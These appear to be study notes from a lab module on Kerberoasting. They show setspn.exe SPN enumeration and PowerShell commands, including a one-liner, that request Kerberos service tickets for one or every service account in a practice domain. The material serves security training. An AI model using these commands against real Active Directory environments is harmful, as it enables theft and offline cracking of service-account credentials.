## Kerberoasting - Semi Manual method

Before tools such as `Rubeus` existed, stealing or forging Kerberos tickets was a complex, manual process.Let's begin with the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) binary to enumerate SPNs in the domain.
#### Enumerating SPNs with setspn.exe

```cmd
C:\htb> setspn.exe -Q */*
```
![](Screenshot%202026-05-27%20at%2018.43.36.png)
#### Targeting a Single User

```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel 
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
![](Screenshot%202026-05-27%20at%2018.44.20.png)
#### Retrieving All Tickets Using setspn.exe

```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
![](Screenshot%202026-05-27%20at%2018.56.47.png)
